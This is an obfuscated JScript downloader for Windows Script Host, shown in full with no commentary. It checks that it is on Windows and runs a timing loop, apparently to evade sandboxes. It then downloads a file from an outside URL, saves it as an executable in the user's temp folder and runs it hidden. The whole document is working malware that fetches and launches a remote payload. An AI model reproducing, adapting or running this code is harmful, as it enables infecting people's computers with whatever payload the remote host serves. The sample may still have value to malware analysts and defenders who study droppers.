var AM = false;
var PQ = "CreateObject";
var Aq = function O() {return WScript[PQ]("WScript.Shell");}(), GC = 11;
var U = "MSXML2.XMLHTTP";
var HJ = 2123213;
var Bg = 0;
function N(c0){Aq["Run"](c0, Bg, Bg);};
function G(){return "" + U;};
function I(zr, e){Bg = Bg * 1; return zr - e;};
function c(){return PQ;};
/*@cc_on
  @if (@_win32 || @_win64)
    AM = true;
  @end
@*/
if (AM)
{
var r = "";
function V(){return 22;};
var hI = 0; var cZ = 0;
function gy()
{
var Zq = new this["Date"]();
var i = Zq["getUTCMilliseconds"]();
WScript["Sleep"](V());
var Zq = new this["Date"]();
var s = Zq["getUTCMilliseconds"]();
WScript["Sleep"](V());
var Zq = new this["Date"]();
var iP = Zq["getUTCMilliseconds"]();
var hI = "L";
hI = I(s, i);
var cZ = "uP";
cZ = I(iP, s);
r = "open";
return I(hI, cZ);
}
var xK = false;
var CZ = false;
for (var Z = Bg; Z < V() * 1; Z++){if (gy() != Bg){
xK = true; 
cZ = "31" + 11 * hI + cZ; 
CZ = true; 
break;
}}
function Xi() {return ((xK == true) && (xK == CZ)) ? 1 : Bg;};
if (xK && Xi() && CZ){
function eI() {return Aq["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "lFEbptYU2.exe";};
 iJ = G();
 h = WScript[PQ](iJ);
 var Xe = 1;
 while (Xe){
try {
h[r]("GET", "http://caferacerpneus.com.br/lw2osd", false);
h["send"]();
Q = "Sleep";
for (;;){WScript[Q](V() * 11); if (h["readystate"] >= 2 * 2) break;};
Xe = Bg;
} catch(n){};
}
function bd(Em) {var D = (1, 2, 3, 4, 5, Em); return D;};
vT = WScript[c()]("ADODB.Stream");
iJ = vT;
iJ[r]();
iJ["type"] = bd(1);
iJ["write"](h["ResponseBody"]);
vT["position"] = bd(Bg);
iJ["Save" + "ToFile"](eI(), 2);
vT["c"+"lose"]();
q = eI();
N(q);
}
}

